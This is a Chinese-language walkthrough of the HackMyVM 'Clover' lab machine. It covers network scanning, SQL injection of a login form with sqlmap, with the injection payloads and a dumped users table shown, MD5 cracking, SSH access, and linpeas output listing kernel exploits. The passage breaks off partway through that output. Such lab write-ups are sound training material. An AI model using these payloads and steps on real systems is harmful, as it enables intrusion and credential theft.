---
title: HMV-Clover
description: Enjoy it.
pubDate: 14 12 2025
image: /mechine/Clover.jpg
categories:
  - Documentation
tags:
  - Hackmyvm
  - Linux
---

# 信息收集
## IP定位
```bash
──(root㉿kali)-[/home/kali]
└─# arp-scan -l -I eth0 | grep "00:50:56"          
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
172.16.53.36    00:50:56:2e:26:e8       (Unknown)
```

## namp扫描
```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sTCV -T4 -p0-65535 172.16.53.36 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-14 01:24 EST
Nmap scan report for 172.16.53.36
Host is up (0.00051s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE  SERVICE    VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Mar 26  2021 maintenance
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.16.55.210
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp   open   ssh        OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 bc:a7:bf:7f:23:83:55:08:f7:d1:9a:92:46:c6:ad:2d (DSA)
|   2048 96:bd:c2:57:1c:91:7b:0a:b9:49:5e:7f:d1:37:a6:65 (RSA)
|   256 b9:d9:9d:58:b8:5c:61:f2:36:d9:b2:14:e8:00:3c:05 (ECDSA)
|_  256 24:29:65:28:6e:fa:07:6a:f1:6b:fa:07:a0:13:1b:b6 (ED25519)
80/tcp   open   http       Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 3 disallowed entries 
|_/admin /root /webmaster
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
110/tcp  closed pop3
443/tcp  closed https
5781/tcp closed 3par-evts
8080/tcp closed http-proxy
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.79 seconds
                                                                 
```

## gobuster
```bash
/index.html           (Status: 200) [Size: 3]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/status               (Status: 200) [Size: 10]
/javascript           (Status: 301) [Size: 317] [--> http://172.16.53.36/javascript/]
/website              (Status: 301) [Size: 314] [--> http://172.16.53.36/website/]
/robots.txt           (Status: 200) [Size: 105]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://172.16.53.36/phpmyadmin/]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
```

### /robots.txt
```bash
User-agent: *
Allow: /status
Allow: /status-admin

Disallow: /admin
Disallow: /root
Disallow: /webmaster
```

## dirsearch
```bash
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://172.16.53.36       
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                
 (_||| _) (/_(_|| (_| )                                                                                                                                         
                                                                                                                                                                
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_172.16.53.36/_25-12-14_02-02-35.txt

Target: http://172.16.53.36/

[02:02:35] Starting:  

02:02:44] 301 -  312B  - /CFIDE  ->  http://172.16.53.36/CFIDE/             
[02:02:44] 200 -  451B  - /CFIDE/                                           
[02:02:44] 200 -    9KB - /CFIDE/Administrator/                             
[02:02:50] 301 -  317B  - /javascript  ->  http://172.16.53.36/javascript/  
[02:02:55] 301 -  317B  - /phpmyadmin  ->  http://172.16.53.36/phpmyadmin/  
[02:02:55] 200 -    9KB - /phpmyadmin/                                      
[02:02:55] 200 -    3KB - /phpmyadmin/docs/html/index.html                  
[02:02:55] 200 -    8KB - /phpmyadmin/index.php                             
[02:02:57] 200 -   83B  - /robots.txt                                       
[02:02:58] 403 -  277B  - /server-status                                    
[02:02:58] 403 -  277B  - /server-status/
[02:02:59] 200 -   10B  - /status                                           
[02:02:59] 200 -   10B  - /status?full=true                                 
[02:03:04] 301 -  314B  - /website  ->  http://172.16.53.36/website/        
                                                                             
Task Completed   
```

### [/CFIDE/Administrator/login.php](http://172.16.53.36/CFIDE/Administrator/login.php)
```bash
<!doctype html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <form action="#" method="POST">
        <div class="container">
          <label for="uname"><b>Username</b></label>
          <input type="text" placeholder="Enter Username" name="uname" required>
          <br>
          <br>
          <label for="pswd"><b>Password</b></label>
          <input type="password" placeholder="Enter Password" name="pswd" required>

          <button type="submit">Login</button>
        </div>
      </form> 
</body>
</html>
```



# SQL注入
```bash
POST /CFIDE/Administrator/login.php HTTP/1.1
Host: 172.16.53.36
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Origin: http://172.16.53.36
Connection: keep-alive
Referer: http://172.16.53.36/CFIDE/Administrator/login.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

uname=admin&pswd=123

```

```bash
──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# sqlmap -r sqlmap.txt --dbs --flush-session --level=5 --risk=3
        ___
       __H__                                                                   
 ___ ___[.]_____ ___ ___  {1.8.11#stable}                                      
|_ -| . ["]     | .'| . |                                                      
|___|_  [']_|_|_|__,|  _|                                                      
      |_|V...       |_|   https://sqlmap.org                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:14:31 /2025-12-14/

[02:14:31] [INFO] parsing HTTP request from 'sqlmap.txt'
[02:14:31] [INFO] testing connection to the target URL
[02:14:31] [INFO] testing if the target URL content is stable
[02:14:31] [INFO] target URL content is stable
[02:14:31] [INFO] testing if POST parameter 'uname' is dynamic
[02:14:31] [WARNING] POST parameter 'uname' does not appear to be dynamic
[02:14:31] [WARNING] heuristic (basic) test shows that POST parameter 'uname' might not be injectable
[02:14:31] [INFO] testing for SQL injection on POST parameter 'uname'
[02:14:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:14:31] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                          
[02:14:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                          
[02:14:31] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[02:14:31] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                         
[02:14:31] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                                                         
[02:14:31] [INFO] testing 'Generic inline queries'
[02:14:31] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[02:14:31] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                                                             
[02:14:31] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                                                      
[02:14:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[02:14:41] [INFO] POST parameter 'uname' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                        
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[02:14:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[02:14:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[02:14:46] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[02:14:47] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[02:14:47] [INFO] checking if the injection point on POST parameter 'uname' is a false positive
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[02:15:05] [INFO] testing if POST parameter 'pswd' is dynamic
[02:15:05] [WARNING] POST parameter 'pswd' does not appear to be dynamic
[02:15:05] [WARNING] heuristic (basic) test shows that POST parameter 'pswd' might not be injectable
[02:15:05] [INFO] testing for SQL injection on POST parameter 'pswd'
[02:15:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:15:05] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                          
[02:15:05] [INFO] testing 'Generic inline queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[02:15:06] [INFO] testing 'Generic UNION query (85) - 1 to 10 columns'
[02:15:06] [WARNING] POST parameter 'pswd' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 116 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 1230 FROM (SELECT(SLEEP(5)))YPCw) AND 'JDtR'='JDtR&pswd=123
---
[02:15:06] [INFO] the back-end DBMS is MySQL
[02:15:06] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[02:15:06] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.16.53.36'                                                     
[02:15:06] [WARNING] your sqlmap version is outdated

[*] ending @ 02:15:06 /2025-12-14/
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# sqlmap -r sqlmap.txt --dbs                                   
        ___
       __H__                                                                   
 ___ ___[)]_____ ___ ___  {1.8.11#stable}                                      
|_ -| . [(]     | .'| . |                                                      
|___|_  [.]_|_|_|__,|  _|                                                      
      |_|V...       |_|   https://sqlmap.org                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:33:09 /2025-12-14/

[02:33:09] [INFO] parsing HTTP request from 'sqlmap.txt'
[02:33:09] [INFO] resuming back-end DBMS 'mysql' 
[02:33:09] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: pswd (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin&pswd=-4090' OR 1618=1618-- tOcq

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin&pswd=123' AND (SELECT 1676 FROM (SELECT(SLEEP(5)))JFAv)-- twPX

Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=-6314' OR 6534=6534-- XRHY&pswd=123

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 4958 FROM (SELECT(SLEEP(5)))gKGF)-- RxMA&pswd=123
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: uname, type: Single quoted string (default)
[1] place: POST, parameter: pswd, type: Single quoted string
[q] Quit
> 1
[02:33:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[02:33:12] [INFO] fetching database names
[02:33:12] [INFO] fetching number of databases
[02:33:12] [INFO] resumed: 5
[02:33:12] [INFO] resumed: information_schema
[02:33:12] [INFO] resumed: clover
[02:33:12] [INFO] resumed: mysql
[02:33:12] [INFO] resumed: performance_schema
[02:33:12] [INFO] resumed: sys
available databases [5]:
[*] clover
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

[02:33:12] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.16.53.36'                                                     
[02:33:12] [WARNING] your sqlmap version is outdated

[*] ending @ 02:33:12 /2025-12-14/
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# sqlmap -r sqlmap.txt --batch --tables -D clover
        ___
       __H__                                                                   
 ___ ___[.]_____ ___ ___  {1.8.11#stable}                                      
|_ -| . [)]     | .'| . |                                                      
|___|_  [,]_|_|_|__,|  _|                                                      
      |_|V...       |_|   https://sqlmap.org                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:34:47 /2025-12-14/

[02:34:47] [INFO] parsing HTTP request from 'sqlmap.txt'
[02:34:47] [INFO] resuming back-end DBMS 'mysql' 
[02:34:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: pswd (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin&pswd=-4090' OR 1618=1618-- tOcq

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin&pswd=123' AND (SELECT 1676 FROM (SELECT(SLEEP(5)))JFAv)-- twPX

Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=-6314' OR 6534=6534-- XRHY&pswd=123

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 4958 FROM (SELECT(SLEEP(5)))gKGF)-- RxMA&pswd=123
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: uname, type: Single quoted string (default)
[1] place: POST, parameter: pswd, type: Single quoted string
[q] Quit
> 0
[02:34:47] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[02:34:47] [INFO] fetching tables for database: 'clover'
[02:34:47] [INFO] fetching number of tables for database 'clover'
[02:34:47] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[02:34:47] [INFO] retrieved: 1
[02:34:47] [INFO] retrieved: users
Database: clover
[1 table]
+-------+
| users |
+-------+

[02:34:47] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.16.53.36'                                                     
[02:34:47] [WARNING] your sqlmap version is outdated

[*] ending @ 02:34:47 /2025-12-14/

```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# sqlmap -r sqlmap.txt --batch --dump -T users -D clover
        ___
       __H__                                                                   
 ___ ___[)]_____ ___ ___  {1.8.11#stable}                                      
|_ -| . ["]     | .'| . |                                                      
|___|_  [.]_|_|_|__,|  _|                                                      
      |_|V...       |_|   https://sqlmap.org                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:36:01 /2025-12-14/

[02:36:01] [INFO] parsing HTTP request from 'sqlmap.txt'
[02:36:01] [INFO] resuming back-end DBMS 'mysql' 
[02:36:01] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: pswd (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin&pswd=-4090' OR 1618=1618-- tOcq

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin&pswd=123' AND (SELECT 1676 FROM (SELECT(SLEEP(5)))JFAv)-- twPX

Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=-6314' OR 6534=6534-- XRHY&pswd=123

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 4958 FROM (SELECT(SLEEP(5)))gKGF)-- RxMA&pswd=123
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: uname, type: Single quoted string (default)
[1] place: POST, parameter: pswd, type: Single quoted string
[q] Quit
> 0
Table: users
[3 entries]
+----+----------------------------------+-----------+
| id | password                         | username  |
+----+----------------------------------+-----------+
| 1  | 33a41c7507cy5031d9tref6fdb31880c | 0xBush1do |
| 2  | 69a41c7507ad7031d9decf6fdb31810c | asta      |
| 3  | 92ift37507ad7031d9decf98setf4w0c | 0xJin     |
+----+----------------------------------+-----------+

[02:36:09] [INFO] table 'clover.users' dumped to CSV file '/root/.local/share/sqlmap/output/172.16.53.36/dump/clover/users.csv'                               
[02:36:09] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.16.53.36'                                                     
[02:36:09] [WARNING] your sqlmap version is outdated

[*] ending @ 02:36:09 /2025-12-14/


```

 69a41c7507ad7031d9decf6fdb31810c | asta

成功登录网页但是什么也没有

![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765698512259-7900a6e5-c863-4971-a8a0-c75b74c7007b.png)

[MD5 - Cripta e decripta stringhe in md5 - MD5ONLINE](https://md5online.it)

md5解密69a41c7507ad7031d9decf6fdb31810c

得到<font style="color:#004030;">asta$$123</font>明文密码

# ssh-asta
```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# ssh asta@172.16.53.36                                 
The authenticity of host '172.16.53.36 (172.16.53.36)' can't be established.
ED25519 key fingerprint is SHA256:0sF0ePGQNGhI+61HmDsXzDvIYL3L6JpUs2uiB2tkUrE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.53.36' (ED25519) to the list of known hosts.
asta@172.16.53.36's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Wed Apr  7 08:38:41 2021 from desktop-f5mldm7
asta@Clover:~$ 
```

```bash
asta@Clover:~$ cat local.txt 



                                |     |
                                \\_V_//
                                \/=|=\/
       Asta PWN!                 [=v=]
                               __\___/_____
                              /..[  _____  ]
                             /_  [ [  M /] ]
                            /../.[ [ M /@] ]
                           <-->[_[ [M /@/] ]
                          /../ [.[ [ /@/ ] ]
     _________________]\ /__/  [_[ [/@/ C] ]
    <_________________>>0---]  [=\ \@/ C / /
       ___      ___   ]/000o   /__\ \ C / /
          \    /              /....\ \_/ /
       ....\||/....           [___/=\___/
      .    .  .    .          [...] [...]
     .      ..      .         [___/ \___]
     .    0 .. 0    .         <---> <--->
  /\/\.    .  .    ./\/\      [..]   [..]
 / / / .../|  |\... \ \ \    _[__]   [__]_
/ / /       \/       \ \ \  [____>   <____]



34f35ca9ea7febe859be7715b707d684
```

```bash
asta@Clover:/home$ ls -al
total 16
drwxr-xr-x  4 root  root  4096 Mar 24  2021 .
drwxr-xr-x 22 root  root  4096 Mar 24  2021 ..
drwx------ 17 asta  asta  4096 Apr  7  2021 asta
drwx------  2 sword sword 4096 Mar 27  2021 sword
```

可以发现还存在sword用户

## 上传linpeas.sh
```bash
┌──(root㉿kali)-[/home/kali]
└─# scp /usr/share/peass/linpeas/linpeas.sh asta@172.16.53.36:/tmp/ 

```

```bash
asta@Clover:/tmp$ ./linpeas.sh 

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                           
                               ╚═══════════════════╝                           
OS: Linux version 3.16.0-11-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u2) ) #1 SMP Debian 3.16.84-1 (2020-06-09)
User & Groups: uid=1000(asta) gid=1000(asta) groups=1000(asta),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),118(bluetooth)
Hostname: Clover

[+] /bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)                                                             
[+] /bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                          
[+] /bin/netcat is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)                            
[+] nmap is available for network discovery & port scanning, you should use it yourself                                                                       
                                                                               

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE                                                
                                                                               
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                            
                              ╚════════════════════╝                           
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                             
Linux version 3.16.0-11-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u2) ) #1 SMP Debian 3.16.84-1 (2020-06-09)
lsb_release Not Found
                                                                               
╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                                
Sudo version 1.8.10p3                                                          


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                        
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games                       

╔══════════╣ Date & uptime
Sun Dec 14 02:55:04 EST 2025                                                   
 02:55:04 up 26 min,  2 users,  load average: 0.22, 0.05, 0.02

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                      
UUID=a3fa4055-5438-415f-a84e-3e8ac12fe02a /               ext4    errors=remount-ro 0       1
UUID=946c2d24-207b-4dd8-8414-3e92501cad5f none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                           
sda
sda1
sda2
sda5

╔══════════╣ Environment
╚ Any private information inside environment variables?                        
MAIL=/var/mail/asta                                                            
SSH_CLIENT=172.16.55.210 58162 22
USER=asta
SHLVL=1
HOME=/home/asta
OLDPWD=/
SSH_TTY=/dev/pts/0
LOGNAME=asta
_=./linpeas.sh
TERM=xterm-256color
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
SHELL=/bin/bash
PWD=/tmp
SSH_CONNECTION=172.16.55.210 58162 172.16.53.36 22

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                         
dmesg Not Found                                                                
                                                                               
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                             
[+] [CVE-2016-5195] dirtycow                                                   

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: less probable
   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-9322] BadIRET

   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
   Exposure: less probable
   Tags: RHEL<=7,fedora=20
   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Tags: ubuntu=(14.04|15.10){kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2015-3290] espfix64_NMI

   Details: http://www.openwall.com/lists/oss-security/2015/08/04/8
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/37722

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: less probable
   Tags: ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic},ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2016-0728] keyring

